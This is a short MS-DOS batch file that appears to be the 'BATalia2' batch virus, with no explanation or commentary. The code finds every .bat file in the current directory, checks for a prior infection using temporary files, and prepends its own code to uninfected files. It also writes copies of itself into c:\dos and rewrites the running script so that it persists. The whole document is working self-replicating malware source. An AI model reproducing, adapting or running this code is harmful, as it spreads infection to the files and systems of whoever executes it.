@echo off
rem YYYHA
if "%1"=="2" goto s
for %%b in (*.bat) do call %0 2 %%b
goto b
:s
copy %2 p>l
echo NNN>>p
echo 1>z1
echo 2>z2
echo 3>z3
del z?/p<p>l
if exist z? goto i
goto e
:i
type %0>b
copy b a/a>l
copy %2 t>l
copy /b a+t %2>l
goto e
:b
echo rem  >x
copy x+x+x+x+x+x+x+x+x y>l
copy y+y+y+y+y+y+y z>l
echo @copy c:\dos\y %%0>>z
copy z c:\dos\x>l
copy %0 c:\dos\y>l
del ??>l
echo on
@copy c:\dos\x %0>nul
:e
rem BATalia2
